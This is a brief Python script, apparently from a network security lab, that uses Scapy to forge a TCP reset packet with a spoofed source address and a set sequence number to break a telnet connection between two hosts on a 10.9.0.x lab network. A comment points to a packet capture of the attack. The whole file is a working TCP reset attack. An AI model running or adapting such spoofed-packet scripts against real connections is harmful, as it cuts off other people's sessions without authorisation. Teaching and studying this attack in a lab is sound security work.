from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=50080, dport=23, flags="R", seq=2097545802) # Check using Wireshark.
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)

# See the ManualRST.pcapng file for the attack example.